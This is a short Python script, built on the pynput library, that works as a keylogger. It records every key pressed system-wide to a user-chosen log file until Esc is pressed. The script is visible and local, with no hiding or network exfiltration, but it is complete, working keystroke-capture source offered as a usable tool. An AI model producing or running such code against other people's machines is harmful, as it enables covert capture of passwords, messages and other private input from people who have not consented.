from pynput import keyboard
import os

def on_press(key, log_file_path):
    try:
        with open(log_file_path, "a") as log_file:
            log_file.write(f'{key.char}')
    except AttributeError:
        with open(log_file_path, "a") as log_file:
            log_file.write(f'[{key}]')

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def start_keylogger(log_file_path):
    with keyboard.Listener(on_press=lambda key: on_press(key, log_file_path), on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    # User input for the directory and log file name
    directory = input("Enter the directory where the log file should be saved: ")
    if not os.path.exists(directory):
        os.makedirs(directory)
        
    log_file_name = input("Enter the log file name (e.g., key_log.txt): ")
    log_file_path = os.path.join(directory, log_file_name)
    
    print(f"Keylogger started. Logging to {log_file_path}. Press 'Esc' to stop.")
    start_keylogger(log_file_path)
